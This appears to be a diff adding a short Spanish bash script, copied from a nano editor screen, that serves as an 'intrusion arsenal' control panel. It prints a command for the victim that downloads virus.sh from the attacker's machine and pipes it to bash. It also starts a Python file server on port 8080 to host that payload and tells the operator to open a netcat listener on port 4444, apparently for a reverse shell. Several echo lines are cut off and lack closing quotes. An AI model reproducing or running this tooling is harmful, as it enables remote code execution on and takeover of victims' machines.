@@ -1,0 +1,22 @@
+ GNU nano 7.2               server                        
+#!/bin/bash
+# Averiguamos nuestra IP automáticamente
+MI_IP=$(hostname -I | awk '{print $1}')
+
+echo "---------------------------------------------------->
+echo "  ARSENAL DE INTRUSIÓN - PANEL DE CONTROL"
+echo "---------------------------------------------------->
+echo "1. Tu IP es: $MI_IP"
+echo "2. Link para la víctima:"
+echo "   wget -qO- http://$MI_IP:8080/virus.sh | bash"
+echo "---------------------------------------------------->
+echo "Lanzando servidor de archivos en puerto 8080..."
+
+# Lanzamos el servidor en segundo plano
+python3 -m http.server 8080 & 
+SERV_PID=$!
+
+echo "Servidor listo (PID: $SERV_PID). Abre otra terminal >
+echo "nc -lvnp 4444"
+echo "---------------------------------------------------->
+
